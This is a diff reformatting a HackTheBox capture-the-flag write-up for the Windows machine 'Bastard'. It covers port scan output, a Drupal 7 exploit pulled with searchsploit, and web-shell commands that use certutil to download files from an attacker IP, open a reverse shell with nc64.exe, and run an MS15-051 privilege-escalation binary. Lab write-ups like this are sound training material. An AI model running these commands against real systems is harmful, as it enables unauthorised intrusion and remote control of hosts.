@@ -1,22 +1,22 @@
-----------------------------------------------------
-# Author -> Shubham Rannpise
-----------------------------------------------------
 # Bastard
-# 14/4/2023
+
+
+| Key | Value |
+|-----|-------|
+| Platform | HackTheBox |
+| OS | Windows |
+| Difficulty | Medium |
+
 10.10.10.9
 
-----------------------------------------------------
-# nmap
-----------------------------------------------------
+## Recon
 ```
 PORT      STATE SERVICE VERSION
 80/tcp    open  http    Microsoft IIS httpd 7.5
 135/tcp   open  msrpc   Microsoft Windows RPC
 49154/tcp open  msrpc   Microsoft Windows RPC
 ```
-----------------------------------------------------
-# exploitaion
----------------------------------------------------
+## Exploitation
 ```
 port 80 runnning drupal 7
 └─$ searchsploit -m php/webapps/41564.php
@@ -38,9 +38,7 @@ curl http://10.10.10.9/shub.php?cmd=certutil -urlcache -split -f http://10.10.16
 curl http://10.10.10.9/shub.php?cmd=nc64.exe -e cmd 10.10.16.2 1234
 got shell
 ```
----------------------------------------------------
-# priv esc
----------------------------------------------------
+## Privilege Escalation
 ```
 10.10.10.9/shub.php?cmd=certutil -urlcache -split -f http://10.10.16.2/ms15-051x64.exe
 ms15-051x64.exe whoami
